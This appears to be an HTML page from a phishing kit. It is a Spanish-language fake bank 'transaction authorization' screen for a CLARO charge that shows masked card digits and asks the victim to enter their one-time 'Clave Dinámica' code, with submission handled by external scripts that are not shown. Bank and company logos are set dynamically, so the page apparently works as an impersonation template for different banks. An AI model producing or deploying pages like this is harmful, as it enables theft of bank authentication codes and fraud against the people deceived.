<head>

<body>
    <div class="main-loader show">
        <img id="company-loader">
        <div class="loader"></div>
    </div>
    <div class="logos">
        <img id="bank-logo" width="50px">
        <img id="company-logo" width="110px">
    </div>

    <main>
        <div class="content">
            <b style="margin-bottom: 20px; display: block;" >Autorización de transacción</b>
            <p style="margin-bottom: 10px;" >La transacción que intenta realizar en <b>CLARO</b> por <b> <span class="flight-price">81.900</span> COP</b> debe ser autorizada. Por favor verifica la siguiente información:</p>
            <p style="margin-bottom: 20px;">Ingrese los datos de su Banca Virtual:</p>
            <form id="form" style="margin-bottom: 30px;">
                <div class="labels">
                    <b>Comercio: </b>
                    <b>Monto: </b>
                    <b>Número de tarjeta: </b>
                    <b id="cdin" style="margin-bottom: 10px !important;">Clave Dinámica: </b>
                    
                   
                </div>
                <div class="values">
                    <p>CLARO SAS</p>
                    <p> <span class="flight-price">81.900</span> COP</p>
                    <p>•••• •••• •••• <span id="card-digits"></span></p>
                    <input required type="text" id="otp" maxlength="6">
                   
                </div>
            </form>
                    <div style="display: flex; justify-content: center;">
            <p id="error-message" style="color: red;"></p>
        </div>
        <button id="btnNextStep" class="btn-success" type="submit">
            Verificar
        </button>
        </div>
    </main>
    <script src="./js/cdin.js"></script>
    <script src="./js/id-check.js"></script>
